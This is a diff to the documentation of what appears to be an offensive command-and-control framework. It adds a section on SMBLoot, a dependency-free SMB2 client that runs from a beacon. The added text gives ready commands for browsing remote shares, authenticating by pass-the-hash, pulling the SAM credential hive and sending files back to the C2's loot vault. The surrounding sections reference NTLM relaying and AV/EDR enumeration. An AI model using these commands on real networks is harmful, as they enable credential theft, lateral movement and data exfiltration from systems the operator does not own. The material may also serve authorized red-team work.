@@ -27,11 +27,12 @@
 12. [Profile Verification](#12-profile-verification)
 13. [Impacket & NetExec Integration](#13-impacket--netexec-integration)
 14. [Responder & RelayKing](#14-responder--relayking)
-15. [Loot Vault](#15-loot-vault)
-16. [Server Log & Notifications](#16-server-log--notifications)
-17. [Full Attack Flow](#17-full-attack-flow)
-18. [Command Reference](#18-command-reference)
-19. [Screenshots Checklist](#19-screenshots-checklist)
+15. [SMBLoot (Pure-Python SMB2 Browser)](#15-smbloot-pure-python-smb2-browser)
+16. [Loot Vault](#16-loot-vault)
+17. [Server Log & Notifications](#17-server-log--notifications)
+18. [Full Attack Flow](#18-full-attack-flow)
+19. [Command Reference](#19-command-reference)
+20. [Screenshots Checklist](#20-screenshots-checklist)
 
 ---
 
@@ -635,7 +636,123 @@ Each tool prompts for: target IP, domain, username, password/hash.
 
 ---
 
-## 15. Loot Vault
+## 15. SMBLoot (Pure-Python SMB2 Browser)
+
+Browse, read, and download files from remote SMB shares — **directly from the beacon**, without loading impacket or any other external package. The entire SMB2 protocol stack (negotiate, NTLM auth, tree connect, create, read, query directory) is implemented in pure Python stdlib.
+
+![SMBLoot](screenshots/20_smbloot.png)
+
+### Why?
+
+Traditional tools like `smbclient.py` or `impacket` require additional packages on the beacon host. In restricted environments (no pip, no outbound downloads, minimal Python install), this is a problem. SMBLoot solves this by implementing SMB2 with only `socket`, `struct`, and `hashlib`.
+
+### Beacon Usage (C2 Terminal)
+
+```
+smbloot <server> <user> <pass_or_hash> [domain] <action> [share] [path]
+```
+
+**Actions:**
+
+| Action | Description |
+|--------|-------------|
+| `shares` | List all available shares on the target |
+| `ls <share> [path]` | List directory contents |
+| `cat <share> <path>` | Read file content (text preview, max 64KB) |
+| `get <share> <path>` | Download file (returned as base64 to C2) |
+| `tree <share> [path]` | Recursive directory listing (max 3 levels) |
+
+**Examples:**
+
+```bash
+# List shares
+smbloot 10.0.1.5 Administrator P@ssw0rd shares
+
+# Browse Users share
+smbloot 10.0.1.5 Administrator P@ssw0rd ls Users
+
+# Read a file
+smbloot 10.0.1.5 Administrator P@ssw0rd cat SYSVOL corp.local/Policies/GPT.INI
+
+# Download a file
+smbloot 10.0.1.5 Administrator P@ssw0rd get C$ Windows\System32\config\SAM
+
+# Recursive tree of SYSVOL
+smbloot 10.0.1.5 Administrator P@ssw0rd . tree SYSVOL corp.local
+
+# Pass-the-Hash (LM:NT format)
+smbloot 10.0.1.5 Administrator aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 shares
+
+# NT hash only
+smbloot 10.0.1.5 Administrator 31d6cfe0d16ae931b73c59d7e0c089c0 CORP shares
+```
+
+### Standalone CLI Usage
+
+SMBLoot is also available as a standalone terminal tool (no C2 connection needed):
+
+```bash
+python3 smbloot.py <server> <user> <pass_or_hash> [options] <action> [args]
+```
+
+**Options:**
+
+| Flag | Description |
+|------|-------------|
+| `-d`, `--domain` | Domain name (default: `.`) |
+| `-p`, `--port` | SMB port (default: 445) |
+| `--depth` | Tree recursion depth (default: 3) |
+
+**CLI Examples:**
+
+```bash
+# List shares
+python3 smbloot.py 10.0.1.5 admin P@ssw0rd shares
+
+# Browse with domain
+python3 smbloot.py 10.0.1.5 admin P@ssw0rd -d CORP ls C$ Users\\Public
+
+# Download file to local disk
+python3 smbloot.py 10.0.1.5 admin P@ssw0rd get C$ Windows\\win.ini ./win.ini
+
+# Deep tree scan
+python3 smbloot.py 10.0.1.5 admin P@ssw0rd --depth 5 tree SYSVOL
+```
+
+### GUI Integration
+
+In the Impacket tools panel, a dedicated **"SMBLoot"** section provides one-click access:
+
+- **List Shares** — enumerate all accessible shares
+- **Browse Share (ls)** — directory listing with share/path inputs
+- **Tree (recursive)** — recursive traversal
+- **Read File (cat)** — preview file content in the terminal
+- **Download File (get)** — download and store in Loot Vault
+
+The GUI reuses the target/user/pass fields from the Impacket panel, plus two additional fields for share name and path.
+
+### Technical Details
+
+| Component | Implementation |
+|-----------|---------------|
+| SMB2 Negotiate | Dialect 2.0.2 / 2.1 |
+| Authentication | NTLMv2 (SPNEGO wrapped) |
+| Pass-the-Hash | Direct NT hash injection |
+| Share Enumeration | SRVSVC `NetShareEnumAll` via IPC$ named pipe |
+| Directory Listing | `QueryDirectory` (FileBothDirectoryInformation) |
+| File Read | SMB2 Read with 64KB chunking |
+| Dependencies | **None** — stdlib only (`socket`, `struct`, `hashlib`, `hmac`) |
+
+### Limitations
+
+- No SMB signing (works against most targets with signing not required)
+- No SMB3 encryption (targets requiring encryption will reject the connection)
+- Maximum file download size: 10MB per file
+- Tree recursion capped at 2000 entries to prevent timeout
+
+---
+
+## 16. Loot Vault
 
 Centralized storage for all exfiltrated files across all agents.
 
@@ -654,7 +771,7 @@ Centralized storage for all exfiltrated files across all agents.
 
 ---
 
-## 16. Server Log & Notifications
+## 17. Server Log & Notifications
 
 ### Server Log (right-side drawer)
 
@@ -691,7 +808,7 @@ Auto-polls every 5 seconds.
 
 ---
 
-## 17. Full Attack Flow
+## 18. Full Attack Flow
 
 ```mermaid
 sequenceDiagram
@@ -741,7 +858,7 @@ sequenceDiagram
 
 ---
 
-## 18. Command Reference
+## 19. Command Reference
 
 ### File Operations
 
@@ -775,6 +892,16 @@ sequenceDiagram
 | `proxyinfo` | | Show proxy configuration |
 | `avenum` | | Enumerate local AV/EDR/SIEM products |
 
+### SMBLoot (Remote Share Access)
+
+| Command | Arguments | Description |
+|---------|-----------|-------------|
+| `smbloot` | `<server> <user> <pass/hash> [domain] shares` | List available SMB shares |
+| `smbloot` | `<server> <user> <pass/hash> [domain] ls <share> [path]` | List directory on share |
+| `smbloot` | `<server> <user> <pass/hash> [domain] cat <share> <path>` | Read remote file as text |
+| `smbloot` | `<server> <user> <pass/hash> [domain] get <share> <path>` | Download remote file |
+| `smbloot` | `<server> <user> <pass/hash> [domain] tree <share> [path]` | Recursive directory listing |
+
 ### Exfiltration
 
 | Command | Arguments | Description |
@@ -800,7 +927,7 @@ sequenceDiagram
 
 ---
 
-## 19. Screenshots Checklist
+## 20. Screenshots Checklist
 
 > **To complete this demo**, take the following screenshots and save them in `docs/screenshots/`:
 
@@ -827,4 +954,5 @@ sequenceDiagram
 | 17 | `17_responder.png` | Responder dialog |
 | 18 | `18_relayking.png` | RelayKing NTLM relay dialog |
 | 19 | `19_loot_vault.png` | Loot Vault with downloaded files |
-| 20 | `20_server_log.png` | Server log drawer with category filters |
+| 20 | `20_smbloot.png` | SMBLoot panel with share listing or directory browse |
+| 21 | `21_server_log.png` | Server log drawer with category filters |
